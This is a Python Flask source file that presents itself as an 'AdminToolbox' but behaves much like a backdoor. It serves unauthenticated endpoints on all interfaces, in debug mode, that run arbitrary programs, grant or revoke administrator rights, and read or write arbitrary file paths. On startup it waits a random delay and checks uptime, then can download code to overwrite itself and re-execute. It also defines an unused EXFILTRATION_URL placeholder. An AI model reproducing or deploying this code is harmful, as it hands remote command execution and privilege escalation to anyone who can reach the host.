import os
import xml.etree.ElementTree as ET
import platform
import subprocess
import logging
from datetime import datetime
import time
import random
import requests
from flask import Flask, render_template, request, jsonify
import sys

# Configure logging
logging.basicConfig(filename='AdminToolbox.log', level=logging.DEBUG, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Add a stream handler to output logs to console
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.DEBUG)
logging.getLogger().addHandler(console_handler)

# Constants
SCRIPT_URL = None
EXFILTRATION_URL = None

# Directories and files required for the project
required_structure = {
    'configs': ['test_config.xml'],
    'logs': ['AdminToolbox.log'],
    'scripts': ['admin_toolbox.py', 'AdminToolbox.ps1'],
    'static/images': ['generated-icon.png'],
    'templates': ['index.html'],
    'tests': ['test_admin_toolbox.py']
}

def regenerate_structure():
    """Self-regenerate missing files and directories."""
    for directory, files in required_structure.items():
        # Create directories if they don't exist
        if not os.path.exists(directory):
            os.makedirs(directory)
            log_action(f"Created directory: {directory}")

        # Create files if they don't exist
        for file in files:
            file_path = os.path.join(directory, file)
            if not os.path.exists(file_path):
                with open(file_path, 'w') as f:
                    f.write(f"# Auto-generated file: {file_path}\n")
                log_action(f"Created file: {file_path}")

def log_action(action, level=logging.INFO):
    # Log to GUI log file
    with open("gui_log.txt", "a") as log_file:
        log_file.write(f"{datetime.now()} - {action}\n")
    
    # Log to AdminToolbox.log and console
    logging.log(level, action)

def start_random_delay():
    delay = random.randint(5, 60)
    time.sleep(delay)
    log_action(f"Random delay of {delay} seconds applied")

def check_uptime():
    if platform.system() == "Windows":
        import win32api
        uptime = (win32api.GetTickCount() / 1000) / 60
    else:
        with open('/proc/uptime', 'r') as f:
            uptime = float(f.readline().split()[0]) / 60
    log_action(f"System uptime: {uptime} minutes")
    return uptime

def self_regenerate():
    if SCRIPT_URL:
        try:
            response = requests.get(SCRIPT_URL)
            if response.status_code == 200:
                with open(__file__, 'w') as file:
                    file.write(response.text)
                log_action("Script self-regenerated successfully")
                os.execv(sys.executable, ['python'] + sys.argv)
            else:
                log_action(f"Failed to download new script: HTTP {response.status_code}", logging.ERROR)
        except Exception as e:
            log_action(f"Error during self-regeneration: {str(e)}", logging.ERROR)
    else:
        log_action("Self-regeneration feature is disabled (SCRIPT_URL is None)", logging.WARNING)

def get_registry_key_value(key, value_name, computer_name=None):
    log_action(f"Getting registry key: {key}\\{value_name} on {computer_name or 'local machine'}")
    try:
        if platform.system() == "Windows":
            import winreg
            if computer_name:
                reg_handle = winreg.ConnectRegistry(computer_name, winreg.HKEY_LOCAL_MACHINE)
            else:
                reg_handle = winreg.HKEY_LOCAL_MACHINE
            
            with winreg.OpenKey(reg_handle, key) as reg_key:
                value, _ = winreg.QueryValueEx(reg_key, value_name)
                return value
        else:
            return f"Registry operations not supported on {platform.system()}"
    except Exception as e:
        log_action(f"Error getting registry key: {str(e)}", logging.ERROR)
        return None

def compare_version(current_version, target_version):
    log_action(f"Comparing versions: current {current_version}, target {target_version}")
    try:
        from packaging import version
        current = version.parse(current_version)
        target = version.parse(target_version)
        if current < target:
            return "Current version is older"
        elif current > target:
            return "Current version is newer"
        else:
            return "Versions are equal"
    except Exception as e:
        log_action(f"Error comparing versions: {str(e)}", logging.ERROR)
        return "Error comparing versions"

def read_xml_file(file_path):
    log_action(f"Reading XML file: {file_path}")
    try:
        tree = ET.parse(file_path)
        root = tree.getroot()
        return "XML read successfully", ET.tostring(root, encoding='unicode')
    except Exception as e:
        log_action(f"Error reading XML file: {str(e)}", logging.ERROR)
        return f"Error reading XML file: {str(e)}", None

def write_xml_file(file_path, xml_content):
    log_action(f"Writing XML file: {file_path}")
    try:
        root = ET.fromstring(xml_content)
        tree = ET.ElementTree(root)
        tree.write(file_path, encoding='unicode', xml_declaration=True)
        return "XML written successfully"
    except Exception as e:
        log_action(f"Error writing XML file: {str(e)}", logging.ERROR)
        return f"Error writing XML file: {str(e)}"

def modify_xml_file(file_path, xpath, new_value):
    log_action(f"Modifying XML file: {file_path}, xpath: {xpath}, new value: {new_value}")
    try:
        tree = ET.parse(file_path)
        root = tree.getroot()
        for elem in root.findall(xpath):
            elem.text = new_value
        tree.write(file_path, encoding='unicode', xml_declaration=True)
        return "XML modified successfully"
    except Exception as e:
        log_action(f"Error modifying XML file: {str(e)}", logging.ERROR)
        return f"Error modifying XML file: {str(e)}"

def manage_admin_permissions(username, action):
    log_action(f"Managing admin permissions: {action} for user {username}")
    try:
        if platform.system() == "Windows":
            import win32net
            import win32netcon
            
            admin_group = win32netcon.DOMAIN_GROUP_RID_ADMINS
            user_info = win32net.NetUserGetInfo(None, username, 1)
            
            if action == "grant":
                win32net.NetLocalGroupAddMembers(None, admin_group, 3, [{'domainandname': username}])
                return f"Admin permissions granted to {username}"
            elif action == "revoke":
                win32net.NetLocalGroupDelMembers(None, admin_group, [username])
                return f"Admin permissions revoked from {username}"
            else:
                return "Invalid action specified"
        else:
            return f"Admin permission management not supported on {platform.system()}"
    except Exception as e:
        log_action(f"Error managing admin permissions: {str(e)}", logging.ERROR)
        return f"Error managing admin permissions: {str(e)}"

def execute_program(program_name, args):
    log_action(f"Executing program: {program_name} with args: {args}")
    try:
        result = subprocess.run([program_name] + args, capture_output=True, text=True)
        return f"Program executed. Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
    except Exception as e:
        log_action(f"Error executing program: {str(e)}", logging.ERROR)
        return f"Error executing program: {str(e)}"

app = Flask(__name__)

@app.route('/')
def index():
    print("Index function called")  # Add this line for debugging
    try:
        return render_template('index.html')
    except Exception as e:
        log_action(f"Error in index route: {str(e)}", logging.ERROR)
        return f"An error occurred: {str(e)}", 500

@app.route('/api/is_windows', methods=['GET'])
def is_windows():
    return jsonify({"is_windows": platform.system() == "Windows"})

@app.route('/api/registry_key', methods=['POST'])
def api_registry_key():
    data = request.json
    result = get_registry_key_value(data['key'], data['value_name'], data.get('computer_name'))
    return jsonify({"result": result})

@app.route('/api/compare_version', methods=['POST'])
def api_compare_version():
    data = request.json
    result = compare_version(data['current_version'], data['target_version'])
    return jsonify({"result": result})

@app.route('/api/read_xml', methods=['POST'])
def api_read_xml():
    data = request.json
    result, content = read_xml_file(data['file_path'])
    return jsonify({"result": result, "content": content})

@app.route('/api/write_xml', methods=['POST'])
def api_write_xml():
    data = request.json
    result = write_xml_file(data['file_path'], data['xml_content'])
    return jsonify({"result": result})

@app.route('/api/modify_xml', methods=['POST'])
def api_modify_xml():
    data = request.json
    result = modify_xml_file(data['file_path'], data['xpath'], data['new_value'])
    return jsonify({"result": result})

@app.route('/api/admin_permissions', methods=['POST'])
def api_admin_permissions():
    data = request.json
    result = manage_admin_permissions(data['username'], data['action'])
    return jsonify({"result": result})

@app.route('/api/execute_program', methods=['POST'])
def api_execute_program():
    data = request.json
    result = execute_program(data['program_name'], data['args'])
    return jsonify({"result": result})

if __name__ == '__main__':
    log_action("AdminToolbox script started", logging.INFO)
    try:
        regenerate_structure()
        start_random_delay()
        uptime = check_uptime()
        log_action(f"System uptime: {uptime} minutes", logging.INFO)
        if uptime > 60:
            self_regenerate()
        else:
            log_action("Skipping self-regeneration due to low uptime", logging.INFO)
        
        log_action("Starting Flask application", logging.INFO)
        app.run(host='0.0.0.0', port=5000, debug=True)
    except Exception as e:
        log_action(f"An error occurred: {str(e)}", logging.ERROR)
        logging.exception("Exception details:")
    finally:
        log_action("AdminToolbox script finished", logging.INFO)